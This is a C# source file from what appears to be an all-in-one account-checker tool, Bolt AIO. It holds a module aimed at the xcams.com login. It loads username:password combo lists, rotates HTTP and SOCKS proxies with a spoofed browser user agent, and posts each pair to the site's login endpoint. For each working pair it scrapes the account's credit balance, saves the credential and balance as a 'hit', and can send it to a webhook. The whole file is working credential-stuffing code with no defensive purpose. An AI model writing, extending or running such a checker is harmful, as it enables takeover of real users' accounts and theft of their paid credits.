using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using BoltCUI;
using Leaf.xNet;

namespace Bolt_AIO
{
    internal class Xcamsmod
    {
        public static List<string> Combos = Program.Combos;
        public static int Combosindex;

        public static void Check()
        {
            for (;;)
            {
                if (Program.Proxyindex > Program.Proxies.Count() - 2) Program.Proxyindex = 0;
                try
                {
                    Interlocked.Increment(ref Program.Proxyindex);
                    using (var req = new HttpRequest())
                    {
                        if (Combosindex >= Combos.Count())
                        {
                            Program.Stop++;
                            break;
                        }

                        Interlocked.Increment(ref Combosindex);
                        var array = Combos[Combosindex].Split(':', ';', '|');
                        var text = array[0] + ":" + array[1];
                        try
                        {
                            switch (Program.ProxyType1)
                            {
                                case "HTTP":
                                    req.Proxy = HttpProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS4":
                                    req.Proxy = Socks4ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                                case "SOCKS5":
                                    req.Proxy = Socks5ProxyClient.Parse(Program.Proxies[Program.Proxyindex]);
                                    req.Proxy.ConnectTimeout = 5000;
                                    break;
                            }

                            req.UserAgent =
                                "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36";
                            req.IgnoreProtocolErrors = true;
                            req.AllowAutoRedirect = true;
                            req.AddHeader("origin", "https://www.xcams.com");
                            req.AddHeader("referer", "https://www.xcams.com/1/?_locale=en");
                            req.AddHeader("sec-fetch-dest", "empty");
                            req.AddHeader("sec-fetch-mode", "cors");
                            req.AddHeader("ec-fetch-site", "same-origin");
                            req.AddHeader("x-requested-with", "XMLHttpRequest");
                            var str = "username=" + array[0] + "&password=" + array[1];
                            req.SslCertificateValidatorCallback =
                                (RemoteCertificateValidationCallback) Delegate.Combine(
                                    req.SslCertificateValidatorCallback,
                                    new RemoteCertificateValidationCallback((obj, cert, ssl, error) =>
                                        (cert as X509Certificate2).Verify()));
                            var strResponse = req.Post("https://www.xcams.com/secure/login.do", str,
                                "application/x-www-form-urlencoded").ToString();
                            {
                                if (strResponse.Contains("success\":false") ||
                                    strResponse.Contains("Invalid email\\/password combination"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("200"))
                                {
                                    Program.Fails++;
                                    Program.TotalChecks++;
                                }
                                else if (strResponse.Contains("success\":true"))
                                {
                                    var cap = req.Get("https://www.xcams.com/1/").ToString();
                                    var credits = Parse(cap, "<span class='header__credits-number js-number-credits'>",
                                        "</span>");
                                    Program.Hits++;
                                    Program.TotalChecks++;
                                    Export.AsResult("/Xcams_hits",
                                        array[0] + ":" + array[1] + " | Credits: " + credits);
                                    if (Program.lorc == "LOG")
                                        Settings.PrintHit("Xcams",
                                            array[0] + ":" + array[1] + " | Credits: " + credits);
                                    if (Settings.sendToWebhook)
                                        Settings.sendTowebhook1(array[0] + ":" + array[1] + " | Credits: " + credits,
                                            "Xcams Hits");
                                }
                            }
                        }
                        catch (Exception)
                        {
                            Program.Combos.Add(text);
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Program.Errors);
                }
            }
        }

        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] {left}, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }

        public static string Base64Encode(string plainText)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
        }
    }
}